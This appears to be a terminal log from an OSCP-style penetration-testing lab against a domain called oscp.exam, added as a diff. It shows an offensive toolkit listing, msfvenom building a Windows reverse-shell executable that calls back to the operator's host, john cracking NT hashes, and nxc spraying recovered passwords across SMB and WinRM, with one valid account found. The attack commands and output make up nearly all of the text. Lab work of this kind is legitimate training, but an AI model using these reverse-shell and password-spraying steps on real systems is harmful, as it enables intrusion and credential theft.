@@ -1,0 +1,1045 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m cd ../../Tools/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m ls
+[1m[36mAddUser.c[0m     foothold.exe         [1m[36mid_ed25519.pub[0m     [1m[36mligolo.exe[0m              [1m[36mnc.exe[0m                 [1m[36mpowerup.ps1[0m    [1m[36mPsExec.exe[0m  [1m[36mrockyou.txt[0m     [1m[36mshell.pem[0m        [1m[36msocat.txt[0m
+[1m[36madduser.exe[0m   [1m[36mGodPotato-NET2.exe[0m   [1m[36mInvoke-Rubeus.ps1[0m  [1m[36mlinpeas.sh[0m              [1m[36mp0wny.php[0m              [1m[36mPowerUp.ps1[0m    [1m[36mpspy32[0m      [1m[36mRubeus.exe[0m      shell.php        tun.exe
+[1m[36mAD_enum.ps1[0m   [1m[36mGodPotato-NET35.exe[0m  [1m[36mkerbrute.exe[0m       [1m[36mmedium_directories.txt[0m  [1m[36mparameters.txt[0m         [1m[36mPowerView.ps1[0m  [1m[36mpspy32s[0m     [1m[36mSeatbelt.exe[0m    shell.sh         [1m[36mwinPEASx64.exe[0m
+backdoor.exe  [1m[36mGodPotato-NET4.exe[0m   [1m[36mLFI.txt[0m            [1m[36mmimikatz_32.exe[0m         [1m[36mphp-reverse-shell.php[0m  privesc.exe    [1m[36mpspy64[0m      [1m[36mSharpHound.ps1[0m  SigmaPotato.exe  [1m[36mwinPEASx86.exe[0m
+[1m[36mchisel.exe[0m    [1m[36mid_ed25519[0m           [1m[36mligolo.elf[0m         [1m[36mmimikatz.exe[0m            [1m[36mplink.exe[0m              [1m[36mPsExec64.exe[0m   [1m[36mpspy64s[0m     shell.exe       [1m[36msocat[0m            [1m[36mwinshell.php[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.197.147 LPORT=9090 -f exe -o chode.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: chode.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m ls
+[1m[36mAddUser.c[0m            [1m[36mid_ed25519.pub[0m          [1m[36mp0wny.php[0m              [1m[36mpspy32s[0m         SigmaPotato.exe
+[1m[36madduser.exe[0m          [1m[36mInvoke-Rubeus.ps1[0m       [1m[36mparameters.txt[0m         [1m[36mpspy64[0m          [1m[36msocat[0m
+[1m[36mAD_enum.ps1[0m          [1m[36mkerbrute.exe[0m            [1m[36mphp-reverse-shell.php[0m  [1m[36mpspy64s[0m         [1m[36msocat.txt[0m
+backdoor.exe         [1m[36mLFI.txt[0m                 [1m[36mplink.exe[0m              [1m[36mrockyou.txt[0m     tun.exe
+[1m[36mchisel.exe[0m           [1m[36mligolo.elf[0m              [1m[36mpowerup.ps1[0m            [1m[36mRubeus.exe[0m      [1m[36mwinPEASx64.exe[0m
+chode.exe            [1m[36mligolo.exe[0m              [1m[36mPowerUp.ps1[0m            [1m[36mSeatbelt.exe[0m    [1m[36mwinPEASx86.exe[0m
+foothold.exe         [1m[36mlinpeas.sh[0m              [1m[36mPowerView.ps1[0m          [1m[36mSharpHound.ps1[0m  [1m[36mwinshell.php[0m
+[1m[36mGodPotato-NET2.exe[0m   [1m[36mmedium_directories.txt[0m  privesc.exe            shell.exe
+[1m[36mGodPotato-NET35.exe[0m  [1m[36mmimikatz_32.exe[0m         [1m[36mPsExec64.exe[0m           [1m[36mshell.pem[0m
+[1m[36mGodPotato-NET4.exe[0m   [1m[36mmimikatz.exe[0m            [1m[36mPsExec.exe[0m             shell.php
+[1m[36mid_ed25519[0m           [1m[36mnc.exe[0m                  [1m[36mpspy32[0m                 shell.sh
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/Tools[0m]
+└─[1m[34m$[0m cd -
+/home/sk4t4/PG/OSCP_B/AD/Loot
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m vim hashes.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m john hashes.txt --show --format=NT --wordlist=$rockyou
+Invalid options combination: "--show"
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m john hashes.txt --format=NT --wordlist=$rockyou
+Using default input encoding: UTF-8
+Loaded 6 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[33mDecember31[39m       ([33m?[39m)
+1g 0:00:00:01 DONE (2026-03-29 15:14) 0.7407g/s 10624Kp/s 10624Kc/s 53526KC/s  _ 09..*7¡Vamos!
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m vim passwords.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m for i in smb rdp winrm; do nxc $i 10.10.197.146 -u users.txt -p passwords.txt;done
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) ([1m[32msigning:True[0m) ([1m[36mSMBv1:None[0m)[1m[33m (Null Auth:True)[0m
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[32m[+][0m oscp.exam\eric.wallows:EricLikesRunning800
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\eric.wallows:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\web_svc:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\john.dorian:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\sql_svc:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Joan.North:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom_admin:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\tom.kinney:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\celia.almeda:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\krbtgt:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Guest:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Administrator:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\eric.wallows:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\web_svc:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\john.dorian:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\sql_svc:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Joan.North:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:Dolphin1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
